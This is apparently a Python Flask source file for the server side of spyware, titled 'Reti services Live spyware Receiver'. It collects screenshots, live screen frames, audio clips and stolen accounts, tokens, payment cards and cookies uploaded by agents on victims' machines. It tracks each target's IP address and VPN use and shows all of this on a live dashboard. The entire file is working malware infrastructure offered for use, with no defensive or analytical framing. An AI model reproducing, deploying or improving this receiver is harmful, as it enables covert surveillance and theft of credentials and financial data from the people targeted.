import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template_string, Response
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_ROOT = "uploads"
os.makedirs(UPLOAD_ROOT, exist_ok=True)
INDEX_FILE = os.path.join(UPLOAD_ROOT, "index.json")

# simple in-memory mute state per target
MUTED = set()

def load_index():
    if os.path.exists(INDEX_FILE):
        try:
            with open(INDEX_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"targets": {}}

def save_index(data):
    with open(INDEX_FILE, "w") as f:
        json.dump(data, f, indent=2)

DASHBOARD = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live spyware Receiver retiservices.gg</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:system-ui,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
  header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 20px;display:flex;justify-content:space-between;align-items:center}
  header h1{font-size:1.3rem;color:#58a6ff}
  .status{font-size:.8rem;color:#8b949e}
  .container{max-width:1300px;margin:0 auto;padding:20px}
  .empty{text-align:center;padding:60px;color:#8b949e}
  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:18px;overflow:hidden}
  .card-h{background:#21262d;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d}
  .card-h h2{font-size:1rem;color:#58a6ff}
  .badge{background:#238636;color:#fff;font-size:.7rem;padding:2px 8px;border-radius:10px}
  .meta{padding:10px 16px;font-size:.8rem;color:#8b949e;border-bottom:1px solid #30363d}
  .meta span{margin-right:14px}
  .section{padding:14px 16px;border-bottom:1px solid #30363d}
  .section:last-child{border-bottom:none}
  .section h3{font-size:.9rem;margin-bottom:10px;color:#c9d1d9}
  .live-wrap{display:flex;gap:16px;flex-wrap:wrap}
  .live-screen{border:1px solid #30363d;border-radius:4px;max-width:480px}
  .live-screen img{width:100%;display:block}
  .ctrl{display:flex;gap:8px;align-items:center;margin-top:8px}
  .btn{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:.8rem}
  .btn:hover{background:#30363d}
  .btn.on{background:#238636;border-color:#238636}
  .btn.off{background:#da3633;border-color:#da3633}
  audio{width:260px;height:30px}
  .acc{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:10px;font-family:monospace;font-size:.75rem;white-space:pre-wrap;word-break:break-all;max-height:280px;overflow-y:auto;color:#f85149}
  .shot-grid{display:flex;flex-wrap:wrap;gap:8px}
  .shot-grid img{width:140px;height:90px;object-fit:cover;border:1px solid #30363d;border-radius:3px}
  a{color:#58a6ff}
</style>
</head>
<body>
<header>
  <h1>Reti services Live spyware Receiver</h1>
  <div class="status">auto-refresh 6s · {{ now }}</div>
</header>
<div class="container">
{% if not targets %}
  <div class="empty">No targets. Waiting for agents...</div>
{% else %}
  {% for tid, data in targets.items() %}
  <div class="card">
    <div class="card-h">
      <h2>{{ tid }}</h2>
      <span class="badge">LIVE</span>
    </div>
    <div class="meta">
      <span>IP: {{ data.get('ip','?') }}</span>
      <span>First: {{ data.get('first_seen','?') }}</span>
      <span>Last: {{ data.get('last_seen','?') }}</span>
      <span>VPN: {{ data.get('vpn','?') }}</span>
    </div>

    <div class="section">
      <h3>Live Screen</h3>
      <div class="live-wrap">
        <div class="live-screen">
          <img id="live-{{ tid }}" src="/file/{{ tid }}/screenshots/live.jpg?t={{ now }}" onerror="this.style.opacity=0.3">
        </div>
      </div>
    </div>

    <div class="section">
      <h3>Live Audio</h3>
      <div class="ctrl">
        <audio id="aud-{{ tid }}" controls {% if tid in muted %}muted{% endif %}
          src="/file/{{ tid }}/audio/{{ (data.get('audio') or [''])[-1] }}"></audio>
        <button class="btn" onclick="toggleMute('{{ tid }}')">Mute / Unmute</button>
      </div>
    </div>

    {% if data.get('accounts') %}
    <div class="section">
      <h3>Accounts · Tokens · Cards · Cookies</h3>
      <div class="acc">{{ data.accounts }}</div>
    </div>
    {% endif %}

    <div class="section">
      <h3>Recent Screenshots ({{ data.get('screenshots',[])|length }})</h3>
      <div class="shot-grid">
        {% for s in (data.get('screenshots') or [])[-10:] %}
          {% if s != 'live.jpg' %}
          <a href="/file/{{ tid }}/screenshots/{{ s }}" target="_blank">
            <img src="/file/{{ tid }}/screenshots/{{ s }}" loading="lazy">
          </a>
          {% endif %}
        {% endfor %}
      </div>
    </div>

    <div class="section">
      <h3>Audio Clips ({{ data.get('audio',[])|length }})</h3>
      {% for a in (data.get('audio') or [])[-6:] %}
      <div style="margin:4px 0">
        <audio controls src="/file/{{ tid }}/audio/{{ a }}"></audio>
        <a href="/file/{{ tid }}/audio/{{ a }}">dl</a>
      </div>
      {% endfor %}
    </div>
  </div>
  {% endfor %}
{% endif %}
</div>
<script>
function toggleMute(tid){
  fetch('/mute/'+tid, {method:'POST'}).then(()=>location.reload());
}
// refresh live image frequently
setInterval(()=>{
  document.querySelectorAll('[id^=live-]').forEach(img=>{
    img.src = img.src.split('?')[0] + '?t=' + Date.now();
  });
}, 4000);
setTimeout(()=>location.reload(), 12000);
</script>
</body>
</html>
"""

@app.route("/")
def home():
    idx = load_index()
    # inject vpn flag from latest accounts if present
    for tid, t in idx.get("targets", {}).items():
        if "VPN: True" in (t.get("accounts") or ""):
            t["vpn"] = "YES"
        elif "VPN: False" in (t.get("accounts") or ""):
            t["vpn"] = "no"
        else:
            t["vpn"] = "?"
    return render_template_string(DASHBOARD, targets=idx.get("targets", {}), now=datetime.now().strftime("%H:%M:%S"), muted=MUTED)

@app.route("/mute/<target_id>", methods=["POST"])
def mute(target_id):
    if target_id in MUTED:
        MUTED.discard(target_id)
    else:
        MUTED.add(target_id)
    return jsonify({"muted": target_id in MUTED})

@app.route("/upload", methods=["POST"])
def upload():
    target_id = request.form.get("target_id", "unknown")
    file_type = request.form.get("file_type", "misc")
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    target_dir = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    os.makedirs(target_dir, exist_ok=True)
    filename = secure_filename(f.filename)
    path = os.path.join(target_dir, filename)
    f.save(path)

    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)

    if file_type == "screenshots":
        if filename not in t["screenshots"]:
            t["screenshots"].append(filename)
        # keep live.jpg as the newest live frame
        if filename == "live.jpg" and "live.jpg" not in t["screenshots"]:
            t["screenshots"].append("live.jpg")
    elif file_type == "audio":
        if filename not in t["audio"]:
            t["audio"].append(filename)
    elif file_type == "logs":
        if filename not in t["logs"]:
            t["logs"].append(filename)
    elif file_type == "accounts":
        try:
            with open(path, "r", errors="ignore") as fh:
                t["accounts"] = fh.read()[-6000:]
        except Exception:
            pass
    save_index(idx)
    return jsonify({"status": "ok"})

@app.route("/file/<target_id>/<file_type>/<filename>")
def serve_file(target_id, file_type, filename):
    directory = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    return send_from_directory(directory, secure_filename(filename))

@app.route("/ping", methods=["POST"])
def ping():
    target_id = request.form.get("target_id", "unknown")
    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    save_index(idx)
    return jsonify({"status": "pong"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
